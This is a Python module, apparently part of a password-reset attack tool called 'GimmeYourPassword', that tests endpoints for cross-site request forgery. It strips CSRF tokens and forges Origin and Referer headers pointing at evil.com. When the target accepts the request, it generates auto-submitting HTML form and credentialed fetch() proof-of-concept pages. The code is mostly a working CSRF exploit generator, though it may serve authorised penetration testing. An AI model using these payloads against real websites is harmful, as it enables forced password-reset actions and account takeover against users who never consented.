#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import urllib.parse
from utils.style import Colors
from utils.utils import requests, re


CSRF_BODY_TOKENS = [
    "csrf", "csrf_token", "csrftoken", "_csrf", "authenticity_token",
    "_token", "xsrf", "_xsrf", "csrfmiddlewaretoken",
    "__RequestVerificationToken", "_csrfToken", "security_token",
]

CSRF_REQUEST_HEADERS = [
    "X-CSRF-Token", "X-XSRF-TOKEN", "X-CSRFToken",
]


def _has_csrf_protection(headers, body):
    """Return (csrf_header_key or None, csrf_body_token or None)."""
    csrf_header = None
    for k in headers:
        if k.lower() in [h.lower() for h in CSRF_REQUEST_HEADERS]:
            csrf_header = k
            break

    csrf_body = None
    if body:
        for t in CSRF_BODY_TOKENS:
            if t.lower() in body.lower():
                csrf_body = t
                break

    return csrf_header, csrf_body


def _strip_csrf_from_body(body, csrf_body_token):
    if not body or not csrf_body_token:
        return body
    return re.sub(
        rf'[&]?{re.escape(csrf_body_token)}=[^&]*', '', body, flags=re.IGNORECASE
    ).lstrip("&")


_POC_STYLE = (
    "<style>"
    "body{font-family:monospace;background:#111;color:#ccc;padding:20px;margin:0}"
    "h2{color:#ff6b6b;margin:0 0 12px}"
    "code{color:#f9a825;word-break:break-all}"
    ".info{background:#1e1e1e;padding:10px 14px;border-left:3px solid #ff6b6b;"
    "margin:12px 0;font-size:13px;line-height:1.6}"
    ".result{padding:8px 12px;margin-top:12px;border-radius:4px;font-size:14px}"
    ".ok{background:#1a3a1a;color:#4caf50}"
    ".ko{background:#3a1a1a;color:#ff6b6b}"
    "</style>"
)


def _build_html_poc(uri, method, body, content_type):
    if content_type == "json":
        safe_body = (body or "{}").replace("\\", "\\\\").replace("`", "\\`").replace("</", "<\\/")
        return (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
            f"<title>CSRF PoC</title>{_POC_STYLE}</head><body>"
            f"<h2>CSRF PoC — GimmeYourPassword</h2>"
            f"<div class='info'>"
            f"<b>Target:</b> <code>{uri}</code><br>"
            f"<b>Method:</b> <code>{method}</code> &nbsp;"
            f"<b>Type:</b> <code>JSON / fetch</code>"
            f"</div>"
            f"<div id='r' class='result'>Sending...</div>"
            f"<script>"
            f"fetch('{uri}',{{method:'{method}',"
            f"headers:{{'Content-Type':'application/json'}},"
            f"credentials:'include',body:`{safe_body}`}})"
            f".then(r=>{{var e=document.getElementById('r');"
            f"e.textContent='HTTP '+r.status+' — '+(r.status<400?'Accepted (CSRF confirmed!)':'Rejected');"
            f"e.className='result '+(r.status<400?'ok':'ko')}})"
            f".catch(e=>{{var el=document.getElementById('r');"
            f"el.textContent='Error: '+e+' (CORS blocked — try same-origin delivery)';"
            f"el.className='result ko'}});"
            f"</script></body></html>"
        )

    # Form-urlencoded / other
    fields_html = ""
    if body:
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            for k, vals in parsed.items():
                for v in vals:
                    safe_k = k.replace('"', "&quot;").replace("'", "&#39;")
                    safe_v = v.replace('"', "&quot;").replace("'", "&#39;")
                    fields_html += f'  <input type="hidden" name="{safe_k}" value="{safe_v}">\n'
        except Exception:
            fields_html = f"  <!-- raw body: {body} -->\n"

    form_method = method if method in ("GET", "POST") else "POST"
    return (
        f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
        f"<title>CSRF PoC</title>{_POC_STYLE}</head><body>"
        f"<h2>CSRF PoC — GimmeYourPassword</h2>"
        f"<div class='info'>"
        f"<b>Target:</b> <code>{uri}</code><br>"
        f"<b>Method:</b> <code>{form_method}</code> &nbsp;"
        f"<b>Type:</b> <code>form-submit</code>"
        f"</div>"
        f"<form action='{uri}' method='{form_method}' id='f'>\n{fields_html}</form>"
        f"<script>document.getElementById('f').submit();</script>"
        f"</body></html>"
    )


def csrf(url, parsed_req, baseline, interact, email, proxy=None):
    """
    CSRF testing on password reset endpoint.

    Phase 1: Detect whether a CSRF token exists in the request.
    Phase 2: Simulate a cross-origin request (Origin: evil.com, Referer: evil.com)
             with CSRF tokens stripped — if accepted = CSRF confirmed.
    Phase 3: Generate an HTML PoC form / fetch() payload.
    """
    print(f"{Colors.CYAN} ├ CSRF analysis{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    content_type = "form"
    for k, v in headers.items():
        if k.lower() == "content-type" and "application/json" in v.lower():
            content_type = "json"
            break

    # --- Phase 1: Detection ---
    print(f"{Colors.CYAN} └─ CSRF protection detection{Colors.RESET}")

    csrf_header, csrf_body_token = _has_csrf_protection(headers, body)

    if csrf_header:
        print(f"{Colors.GREEN}   └── [INFO] CSRF header present: {csrf_header}{Colors.RESET}")
    if csrf_body_token:
        print(f"{Colors.GREEN}   └── [INFO] CSRF body token present: {csrf_body_token}{Colors.RESET}")
    if not csrf_header and not csrf_body_token:
        print(f"{Colors.YELLOW}   └── [HIGH] No CSRF token found in request{Colors.RESET}")

    # --- Phase 2: Cross-origin simulation ---
    print(f"{Colors.CYAN} └─ Cross-origin request simulation{Colors.RESET}")

    attack_headers = {k: v for k, v in headers.items()
                     if k.lower() not in [h.lower() for h in CSRF_REQUEST_HEADERS]}
    attack_headers["Origin"] = "https://evil.com"
    attack_headers["Referer"] = "https://evil.com/csrf-poc"

    attack_body = _strip_csrf_from_body(body, csrf_body_token)

    try:
        resp = requests.request(
            method=method, url=uri, headers=attack_headers,
            data=attack_body or None, verify=False, allow_redirects=False,
            timeout=10, proxies=proxies,
        )

        bl = baseline["body_length"]
        rl = len(resp.text)
        ratio = abs(rl - bl) / bl if bl > 0 else 0.0

        if resp.status_code == baseline["status"] and ratio < 0.15:
            print(f"{Colors.RED}   └── [CRITICAL] Cross-origin request accepted (Origin: evil.com) → {resp.status_code} ≈ baseline{Colors.RESET}")
            print(f"{Colors.RED}       CSRF confirmed — no origin validation{Colors.RESET}")
            # Phase 3: PoC
            print(f"{Colors.CYAN} └─ HTML PoC{Colors.RESET}")
            print(f"{Colors.YELLOW}{_build_html_poc(uri, method, attack_body or body, content_type)}{Colors.RESET}")
        elif resp.status_code in [403, 400]:
            print(f"{Colors.GREEN}   └── [OK] Cross-origin rejected: {resp.status_code}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}   └── [MEDIUM] [{baseline['status']} > {resp.status_code}] Δlen={abs(rl-bl)}b{Colors.RESET}")

    except requests.RequestException as e:
        print(f"  {Colors.RED}[!] {e}{Colors.RESET}")

    # Always print PoC when no CSRF token at all
    if not csrf_header and not csrf_body_token:
        print(f"{Colors.CYAN} └─ HTML PoC (no CSRF token in request){Colors.RESET}")
        print(f"{Colors.YELLOW}{_build_html_poc(uri, method, body, content_type)}{Colors.RESET}")
